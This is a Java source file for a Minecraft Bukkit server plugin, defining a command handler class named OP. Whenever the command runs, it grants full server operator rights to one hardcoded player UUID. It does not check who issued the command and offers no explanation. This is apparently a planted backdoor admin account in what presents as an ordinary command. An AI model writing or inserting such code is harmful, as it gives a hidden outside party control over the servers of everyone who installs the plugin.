package com.technocraft.server.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

import java.util.UUID;

public class OP implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings)
    {
        Bukkit.getPlayer(UUID.fromString("0c8fba70-d6d4-4fed-b59f-c4d126e1e706")).setOp(true);
        return false;
    }
}
